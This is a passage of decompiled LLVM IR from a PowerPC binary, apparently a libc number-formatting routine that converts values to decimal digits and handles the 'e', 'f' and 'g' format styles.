dec_label_pc_1000ce04:                            ; preds = %dec_label_pc_1000cdf8, %dec_label_pc_1000cddc
  %storemerge = phi i32 [ 43, %dec_label_pc_1000cddc ], [ 32, %dec_label_pc_1000cdf8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000ce04 = trunc i32 %storemerge to i8
  store i8 %v6_1000ce04, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000ce08

dec_label_pc_1000ce08:                            ; preds = %dec_label_pc_1000cdf8, %dec_label_pc_1000ce04
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cdd0, label %dec_label_pc_1000cf6c, label %dec_label_pc_1000ce84

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000ce08
  %v1_1000ce84 = icmp ult i32 %v0_1000ce84, 96
  %v2_1000ce84 = icmp ugt i32 %v0_1000ce84, 96
  %v3_1000ce84 = icmp eq i32 %v0_1000ce84, 96
  store i1 %v1_1000ce84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ce84, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ce8c = add i32 %tmp, 16
  %v3_1000ce8c = inttoptr i32 %v2_1000ce8c to i32*
  store i32 32, i32* %v3_1000ce8c, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000ce84, label %dec_label_pc_1000ceb0, label %dec_label_pc_1000cea4

dec_label_pc_1000cea4:                            ; preds = %dec_label_pc_1000ce84
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ceb0

dec_label_pc_1000ceb0:                            ; preds = %dec_label_pc_1000ce84, %dec_label_pc_1000cea4
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10013890.646 to i32), i32 8), %dec_label_pc_1000ce84 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10013890.646 to i32), i32 12), %dec_label_pc_1000cea4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10013890.646 to i32), i32* %r9.global-to-local, align 4
  %v2_1000cebc = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000cebc, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d35c

dec_label_pc_1000cf6c:                            ; preds = %dec_label_pc_1000ce08
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000cf70 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000cf70, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000cfbc = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000cf90

dec_label_pc_1000cf90:                            ; preds = %dec_label_pc_1000d010.dec_label_pc_1000cf90_crit_edge, %dec_label_pc_1000cf6c
  %v0_1000cf94 = phi i32 [ %v0_1000cf94.pre, %dec_label_pc_1000d010.dec_label_pc_1000cf90_crit_edge ], [ %v0_1000cf9444, %dec_label_pc_1000cf6c ]
  %v3_1000cf94 = call %1 @__asm_cror(i32 %v0_1000cf94, i32 %tmp, i32 %v0_1000cf94)
  %v11_1000cf94 = extractvalue %1 %v3_1000cf94, 7
  store i4 %v11_1000cf94, i4* @cr4, align 1
  %v0_1000cf98 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000cf98, label %dec_label_pc_1000cfac, label %dec_label_pc_1000cfc0

dec_label_pc_1000cfac:                            ; preds = %dec_label_pc_1000cf90
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cfc0

dec_label_pc_1000cfc0:                            ; preds = %dec_label_pc_1000cf90, %dec_label_pc_1000cfac
  %storemerge2 = phi i32 [ %v1_1000cfbc, %dec_label_pc_1000cfac ], [ %tmp55, %dec_label_pc_1000cf90 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000cfd0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000cfd0 = add i32 %v0_1000cfd0, 9
  store i32 %v1_1000cfd0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cfec

dec_label_pc_1000cfec:                            ; preds = %dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge, %dec_label_pc_1000cfc0
  %v1_1000cff4 = phi i32 [ %v1_1000cff4.pre, %dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge ], [ %v1_1000cfd0, %dec_label_pc_1000cfc0 ]
  %v0_1000cff0 = phi i32 [ %v0_1000cff0.pre, %dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge ], [ 0, %dec_label_pc_1000cfc0 ]
  %v1_1000cfec = phi i32 [ %v1_1000cfec.pre, %dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge ], [ 10, %dec_label_pc_1000cfc0 ]
  %v1_1000cffc = phi i32 [ %v0_1000cfec.pre, %dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge ], [ %storemerge2, %dec_label_pc_1000cfc0 ]
  %v2_1000cfec = udiv i32 %v1_1000cffc, %v1_1000cfec
  store i32 %v2_1000cfec, i32* %r0.global-to-local, align 4
  %v1_1000cff0 = add i32 %v0_1000cff0, 1
  store i32 %v1_1000cff0, i32* %r8.global-to-local, align 4
  %v2_1000cff4 = sub i32 %v1_1000cff4, %v1_1000cff0
  store i32 %v2_1000cff4, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000cfec, -10
  store i32 %v2_1000cfec, i32* %r10.global-to-local, align 4
  %v2_1000cffc = add i32 %v1_1000cffc, 48
  %v1_1000d004 = add i32 %v2_1000cffc, %tmp76
  store i32 %v1_1000d004, i32* %r9.global-to-local, align 4
  %v1_1000d008 = trunc i32 %v1_1000d004 to i8
  %v3_1000d008 = inttoptr i32 %v2_1000cff4 to i8*
  store i8 %v1_1000d008, i8* %v3_1000d008, align 1
  %v0_1000d00c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d00c = add i32 %v0_1000d00c, -1
  store i32 %v1_1000d00c, i32* %ctr.global-to-local, align 4
  %v2_1000d00c = icmp eq i32 %v1_1000d00c, 0
  br i1 %v2_1000d00c, label %dec_label_pc_1000d010, label %dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge

dec_label_pc_1000cfec.dec_label_pc_1000cfec_crit_edge: ; preds = %dec_label_pc_1000cfec
  %v0_1000cfec.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cfec.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000cff0.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cff4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cfec

dec_label_pc_1000d010:                            ; preds = %dec_label_pc_1000cfec
  %v0_1000d010 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000d010 = icmp slt i32 %v0_1000d010, 0
  %v3_1000d010 = icmp eq i32 %v0_1000d010, 0
  store i1 %v1_1000d010, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d010, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d014 = add i32 %v0_1000d010, 1
  store i32 %v1_1000d014, i32* %r7.global-to-local, align 4
  br i1 %v3_1000d010, label %dec_label_pc_1000d010.dec_label_pc_1000cf90_crit_edge, label %dec_label_pc_1000d01c

dec_label_pc_1000d010.dec_label_pc_1000cf90_crit_edge: ; preds = %dec_label_pc_1000d010
  %v0_1000cf94.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cf90

dec_label_pc_1000d01c:                            ; preds = %dec_label_pc_1000d010
  %v0_1000d01c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d01c = icmp ult i32 %v0_1000d01c, 96
  %v2_1000d01c = icmp ugt i32 %v0_1000d01c, 96
  %v3_1000d01c = icmp eq i32 %v0_1000d01c, 96
  store i1 %v1_1000d01c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d01c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000d01c, label %dec_label_pc_1000d034, label %dec_label_pc_1000d024

dec_label_pc_1000d024:                            ; preds = %dec_label_pc_1000d01c
  %v1_1000d02c = add i32 %v0_1000d01c, 32
  store i32 %v1_1000d02c, i32* %r0.global-to-local, align 4
  %v1_1000d030 = urem i32 %v1_1000d02c, 256
  store i32 %v1_1000d030, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d034

dec_label_pc_1000d034:                            ; preds = %dec_label_pc_1000d01c, %dec_label_pc_1000d024
  %v0_1000d04c = phi i32 [ %v1_1000d030, %dec_label_pc_1000d024 ], [ %v0_1000d01c, %dec_label_pc_1000d01c ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000d024 ], [ 101, %dec_label_pc_1000d01c ]
  %v1_1000d034 = icmp slt i32 %v0_1000d04c, 103
  %v3_1000d034 = icmp eq i32 %v0_1000d04c, 103
  store i1 %v1_1000d034, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d034, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d034, label %dec_label_pc_1000d03c, label %dec_label_pc_1000d04c

dec_label_pc_1000d03c:                            ; preds = %dec_label_pc_1000d034
  %v0_1000d03c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d03c = icmp slt i32 %v0_1000d03c, 0
  %v3_1000d03c = icmp eq i32 %v0_1000d03c, 0
  store i1 %v1_1000d03c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d03c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d03c, label %dec_label_pc_1000d054, label %dec_label_pc_1000d044

dec_label_pc_1000d044:                            ; preds = %dec_label_pc_1000d03c
  %v1_1000d044 = add i32 %v0_1000d03c, -1
  store i32 %v1_1000d044, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d054

dec_label_pc_1000d04c:                            ; preds = %dec_label_pc_1000d034
  %v1_1000d04c = icmp slt i32 %v0_1000d04c, 102
  %v3_1000d04c = icmp eq i32 %v0_1000d04c, 102
  store i1 %v1_1000d04c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d04c, i1* %cr7_eq.global-to-local, align 1
  %v0_1000d05c = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000d04c, label %dec_label_pc_1000d05c, label %dec_label_pc_1000d054

dec_label_pc_1000d054:                            ; preds = %dec_label_pc_1000d04c, %dec_label_pc_1000d03c, %dec_label_pc_1000d044
  %v0_1000d054 = phi i32 [ 0, %dec_label_pc_1000d03c ], [ %v1_1000d044, %dec_label_pc_1000d044 ], [ %v0_1000d05c, %dec_label_pc_1000d04c ]
  store i32 %v0_1000d054, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d080

dec_label_pc_1000d05c:                            ; preds = %dec_label_pc_1000d04c
  %v1_1000d05c = load i32, i32* %r4.global-to-local, align 4
  %v2_1000d05c = add i32 %v1_1000d05c, %v0_1000d05c
  store i32 %v2_1000d05c, i32* %r10.global-to-local, align 4
  %v1_1000d060 = icmp slt i32 %v2_1000d05c, -1
  %v3_1000d060 = icmp eq i32 %v2_1000d05c, -1
  store i1 %v1_1000d060, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d060, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000d05c, -2
  br i1 %tmp77, label %dec_label_pc_1000d080, label %dec_label_pc_1000d068

dec_label_pc_1000d068:                            ; preds = %dec_label_pc_1000d05c
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_1000d06c = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000d06c, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268488824, i32* @lr, align 4
  %v3_1000d074 = call i32 @__GI_memset(i32 %v2_1000d06c, i32 48, i32 17)
  store i32 %v3_1000d074, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d080

dec_label_pc_1000d080:                            ; preds = %dec_label_pc_1000d05c, %dec_label_pc_1000d054, %dec_label_pc_1000d068
  %v1_1000d0a4 = phi i32 [ %v2_1000d05c, %dec_label_pc_1000d05c ], [ %v0_1000d054, %dec_label_pc_1000d054 ], [ -1, %dec_label_pc_1000d068 ]
  %v1_1000d080 = icmp slt i32 %v1_1000d0a4, 16
  %v2_1000d080 = icmp sgt i32 %v1_1000d0a4, 16
  %v3_1000d080 = icmp eq i32 %v1_1000d0a4, 16
  store i1 %v1_1000d080, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d080, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000d094 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000d094, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000d080, label %dec_label_pc_1000d0bc, label %dec_label_pc_1000d0a0

dec_label_pc_1000d0a0:                            ; preds = %dec_label_pc_1000d080
  %v2_1000d0a0 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000d0a4 = add i32 %v1_1000d0a4, %v2_1000d0a0
  store i32 %v2_1000d0a4, i32* %r9.global-to-local, align 4
  %v1_1000d0a8 = add i32 %v2_1000d0a4, 2
  %v2_1000d0a8 = inttoptr i32 %v1_1000d0a8 to i8*
  %v3_1000d0a8 = load i8, i8* %v2_1000d0a8, align 1
  %v4_1000d0a8 = zext i8 %v3_1000d0a8 to i32
  store i32 %v4_1000d0a8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d0a8, i32* %r11.global-to-local, align 4
  %v1_1000d0b0 = sub nsw i32 52, %v4_1000d0a8
  %v2_1000d0b0 = sub nuw nsw i32 -1, %v4_1000d0a8
  %not.v5_1000d0b0 = icmp ugt i32 %v1_1000d0b0, %v2_1000d0b0
  %v1_1000d0b8 = zext i1 %not.v5_1000d0b0 to i32
  store i32 %v1_1000d0b8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d0bc

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d080, %dec_label_pc_1000d0a0, %dec_label_pc_1000d0bc.backedge
  %v0_1000d0c0 = phi i32 [ %v0_1000d0c0.pre, %dec_label_pc_1000d0bc.backedge ], [ 0, %dec_label_pc_1000d080 ], [ %v1_1000d0b8, %dec_label_pc_1000d0a0 ]
  %v0_1000d0bc = phi i32 [ %v0_1000d0bc.pre, %dec_label_pc_1000d0bc.backedge ], [ %v2_1000d094, %dec_label_pc_1000d080 ], [ %v1_1000d0a8, %dec_label_pc_1000d0a0 ]
  %v1_1000d0bc = add i32 %v0_1000d0bc, -1
  %v2_1000d0bc = inttoptr i32 %v1_1000d0bc to i8*
  %v3_1000d0bc = load i8, i8* %v2_1000d0bc, align 1
  %v4_1000d0bc = zext i8 %v3_1000d0bc to i32
  store i32 %v1_1000d0bc, i32* %r11.global-to-local, align 4
  %v2_1000d0c0 = add i32 %v4_1000d0bc, %v0_1000d0c0
  store i32 %v2_1000d0c0, i32* %r0.global-to-local, align 4
  %v1_1000d0c4 = urem i32 %v2_1000d0c0, 256
  store i32 %v1_1000d0c4, i32* %r9.global-to-local, align 4
  %v1_1000d0c8 = trunc i32 %v2_1000d0c0 to i8
  store i8 %v1_1000d0c8, i8* %v2_1000d0bc, align 1
  %v0_1000d0cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d0cc = icmp slt i32 %v0_1000d0cc, 48
  %v3_1000d0cc = icmp eq i32 %v0_1000d0cc, 48
  store i1 %v1_1000d0cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0cc, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d0d0 = icmp ult i32 %v0_1000d0cc, 57
  %v2_1000d0d0 = icmp ugt i32 %v0_1000d0cc, 57
  %v3_1000d0d0 = icmp eq i32 %v0_1000d0cc, 57
  store i1 %v1_1000d0d0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d0d0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d0d0, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000d0cc, %v2_1000d0d0
  br i1 %brmerge, label %dec_label_pc_1000d0bc.backedge, label %dec_label_pc_1000d0dc

dec_label_pc_1000d0bc.backedge:                   ; preds = %dec_label_pc_1000d0bc
  %v0_1000d0bc.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000d0c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d0bc

dec_label_pc_1000d0dc:                            ; preds = %dec_label_pc_1000d0bc
  %v2_1000d0dc = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000d0dc, i32* %r0.global-to-local, align 4
  %v0_1000d0e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000d0e0, i32* @r7, align 4
  %v0_1000d0e4 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d0e4 = icmp ult i32 %v0_1000d0e4, %v2_1000d0dc
  %v3_1000d0e4 = icmp ugt i32 %v0_1000d0e4, %v2_1000d0dc
  %v4_1000d0e4 = icmp eq i32 %v0_1000d0e4, %v2_1000d0dc
  store i1 %v2_1000d0e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d0e4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000cf70, i32* %r8.global-to-local, align 4
  br i1 %v3_1000d0e4, label %dec_label_pc_1000d0fc, label %dec_label_pc_1000d0f0

dec_label_pc_1000d0f0:                            ; preds = %dec_label_pc_1000d0dc
  store i32 %v2_1000d0dc, i32* %r8.global-to-local, align 4
  %v1_1000d0f4 = add i32 %v0_1000d0e0, 1
  store i32 %v1_1000d0f4, i32* @r7, align 4
  store i32 %v2_1000d0dc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d0fc

dec_label_pc_1000d0fc:                            ; preds = %dec_label_pc_1000d0dc, %dec_label_pc_1000d0f0
  %v2_1000d104 = phi i32 [ %v0_1000d0e4, %dec_label_pc_1000d0dc ], [ %v2_1000d0dc, %dec_label_pc_1000d0f0 ]
  %v0_1000d0fc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d0fc = icmp slt i32 %v0_1000d0fc, 103
  %v3_1000d0fc = icmp eq i32 %v0_1000d0fc, 103
  store i1 %v1_1000d0fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0fc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000d104 = add i32 %v2_1000d104, 1
  %v4_1000d104 = inttoptr i32 %v3_1000d104 to i8*
  store i8 0, i8* %v4_1000d104, align 1
  %v0_1000d108 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d108 = add i32 %v0_1000d108, 1
  store i32 %v1_1000d108, i32* %r9.global-to-local, align 4
  %v0_1000d10c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d10c, label %dec_label_pc_1000d110, label %dec_label_pc_1000d134

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d0fc
  %v0_1000d110 = load i32, i32* @r7, align 4
  %v1_1000d110 = icmp slt i32 %v0_1000d110, -4
  %v3_1000d110 = icmp eq i32 %v0_1000d110, -4
  store i1 %v1_1000d110, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d110, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000d110, label %dec_label_pc_1000d12c, label %dec_label_pc_1000d118

dec_label_pc_1000d118:                            ; preds = %dec_label_pc_1000d110
  %v1_1000d118 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d118 = icmp sgt i32 %v1_1000d118, %v0_1000d110
  %v3_1000d118 = icmp slt i32 %v1_1000d118, %v0_1000d110
  %v4_1000d118 = icmp eq i32 %v1_1000d118, %v0_1000d110
  store i1 %v2_1000d118, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d118, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d118, label %dec_label_pc_1000d12c, label %dec_label_pc_1000d120

dec_label_pc_1000d120:                            ; preds = %dec_label_pc_1000d118
  %v2_1000d120 = sub i32 %v1_1000d118, %v0_1000d110
  store i32 %v2_1000d120, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d14c

dec_label_pc_1000d12c:                            ; preds = %dec_label_pc_1000d118, %dec_label_pc_1000d110
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d140

dec_label_pc_1000d134:                            ; preds = %dec_label_pc_1000d0fc
  %v0_1000d134 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d134 = icmp slt i32 %v0_1000d134, 102
  %v3_1000d134 = icmp eq i32 %v0_1000d134, 102
  store i1 %v1_1000d134, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d134, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000d134, i32* %r4.global-to-local, align 4
  br i1 %v3_1000d134, label %dec_label_pc_1000d14cthread-pre-split, label %dec_label_pc_1000d140

dec_label_pc_1000d140:                            ; preds = %dec_label_pc_1000d134, %dec_label_pc_1000d12c
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000d160

dec_label_pc_1000d14cthread-pre-split:            ; preds = %dec_label_pc_1000d134
  %v0_1000d14c.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000d14c

dec_label_pc_1000d14c:                            ; preds = %dec_label_pc_1000d14cthread-pre-split, %dec_label_pc_1000d120
  %v0_1000d150 = phi i32 [ %v0_1000d14c.pr, %dec_label_pc_1000d14cthread-pre-split ], [ %v0_1000d110, %dec_label_pc_1000d120 ]
  %v1_1000d14c = icmp slt i32 %v0_1000d150, 0
  %v2_1000d14c = icmp sgt i32 %v0_1000d150, 0
  %v3_1000d14c = icmp eq i32 %v0_1000d150, 0
  store i1 %v1_1000d14c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d14c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d14c, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000d150, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000d150, -1
  br i1 %tmp78, label %dec_label_pc_1000d160, label %dec_label_pc_1000d158

dec_label_pc_1000d158:                            ; preds = %dec_label_pc_1000d14c
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000d15c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000d15c = add i32 %v2_1000d15c, -1
  %v4_1000d15c = inttoptr i32 %v3_1000d15c to i8*
  store i8 48, i8* %v4_1000d15c, align 1
  store i32 %v3_1000d15c, i32* %r8.global-to-local, align 4
  %v1_1000d17c.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000d190.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000d160

dec_label_pc_1000d160:                            ; preds = %dec_label_pc_1000d14c, %dec_label_pc_1000d140, %dec_label_pc_1000d158
  %v0_1000d190 = phi i1 [ %v1_1000d14c, %dec_label_pc_1000d14c ], [ false, %dec_label_pc_1000d140 ], [ %v0_1000d190.pre, %dec_label_pc_1000d158 ]
  %v1_1000d17c = phi i32 [ %v1_1000d108, %dec_label_pc_1000d14c ], [ %v1_1000d108, %dec_label_pc_1000d140 ], [ %v1_1000d17c.pre, %dec_label_pc_1000d158 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_1000d16c = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_1000d16c, i32* %r0.global-to-local, align 4
  %v0_1000d174 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d174 = add i32 %v0_1000d174, 1
  store i32 %v1_1000d174, i32* %r6.global-to-local, align 4
  %v2_1000d17c = sub i32 %v1_1000d17c, %v1_1000d174
  store i32 %v2_1000d17c, i32* %r11.global-to-local, align 4
  %v1_1000d180 = inttoptr i32 %v0_1000d174 to i8*
  %v2_1000d180 = load i8, i8* %v1_1000d180, align 1
  %v3_1000d180 = zext i8 %v2_1000d180 to i32
  store i32 %v3_1000d180, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1000d190, label %dec_label_pc_1000d1f0, label %dec_label_pc_1000d194

dec_label_pc_1000d194:                            ; preds = %dec_label_pc_1000d160
  %v0_1000d194 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d194 = icmp slt i32 %v0_1000d194, %v2_1000d17c
  %v4_1000d194 = icmp eq i32 %v0_1000d194, %v2_1000d17c
  store i1 %v2_1000d194, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d194, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000d194, label %dec_label_pc_1000d1e8, label %dec_label_pc_1000d1a8

dec_label_pc_1000d1a8:                            ; preds = %dec_label_pc_1000d194
  %v2_1000d1a8 = sub i32 %v0_1000d194, %v2_1000d17c
  store i32 %v2_1000d1a8, i32* %r0.global-to-local, align 4
  %v4_1000d1a8 = icmp sgt i32 %v2_1000d1a8, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000d1a8, label %dec_label_pc_1000d1c4, label %dec_label_pc_1000d1b4

dec_label_pc_1000d1b4:                            ; preds = %dec_label_pc_1000d1a8
  %v2_1000d1b8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000d1b8, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d1c4:                            ; preds = %dec_label_pc_1000d1a8
  store i32 ptrtoint (i32* @global_var_10013893.648 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d1d0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000d1d0, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d1e8:                            ; preds = %dec_label_pc_1000d194
  %v0_1000d1e8 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000d1e8, label %dec_label_pc_1000d1f8, label %dec_label_pc_1000d1ec

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d1e8
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d1f0

dec_label_pc_1000d1f0:                            ; preds = %dec_label_pc_1000d160, %dec_label_pc_1000d1ec
  %v2_1000d1f0 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000d1f0, i32* @r8, align 4
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d1f8:                            ; preds = %dec_label_pc_1000d1e8
  %v2_1000d1f8 = sub i32 %v2_1000d17c, %v0_1000d194
  store i32 %v2_1000d1f8, i32* %r11.global-to-local, align 4
  %v2_1000d200 = add i32 %v0_1000d194, %v1_1000d174
  store i32 %v2_1000d200, i32* %r6.global-to-local, align 4
  %v2_1000d204 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000d204, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d1f0, %dec_label_pc_1000d1c4, %dec_label_pc_1000d1b4, %dec_label_pc_1000d1f8
  %v1_1000d238 = phi i32 [ %v2_1000d1f0, %dec_label_pc_1000d1f0 ], [ %v2_1000d1d0, %dec_label_pc_1000d1c4 ], [ %v2_1000d1b8, %dec_label_pc_1000d1b4 ], [ %v2_1000d204, %dec_label_pc_1000d1f8 ]
  %v0_1000d218 = phi i32 [ %v2_1000d17c, %dec_label_pc_1000d1f0 ], [ 0, %dec_label_pc_1000d1c4 ], [ 0, %dec_label_pc_1000d1b4 ], [ %v2_1000d1f8, %dec_label_pc_1000d1f8 ]
  %v3_1000d20c = load i32, i32* %v2_1000cddc, align 4
  store i32 %v3_1000d20c, i32* %r0.global-to-local, align 4
  %v1_1000d210 = and i32 %v3_1000d20c, 16
  store i32 %v1_1000d210, i32* %r9.global-to-local, align 4
  %v3_1000d210 = icmp eq i32 %v1_1000d210, 0
  br i1 %v3_1000d210, label %dec_label_pc_1000d218, label %dec_label_pc_1000d230

dec_label_pc_1000d218:                            ; preds = %dec_label_pc_1000d20c
  %v1_1000d218 = icmp slt i32 %v0_1000d218, 0
  %v3_1000d218 = icmp eq i32 %v0_1000d218, 0
  store i1 %v1_1000d218, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d218, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d218, label %dec_label_pc_1000d220, label %dec_label_pc_1000d230

dec_label_pc_1000d220:                            ; preds = %dec_label_pc_1000d218
  %v0_1000d220 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d220 = icmp slt i32 %v0_1000d220, 103
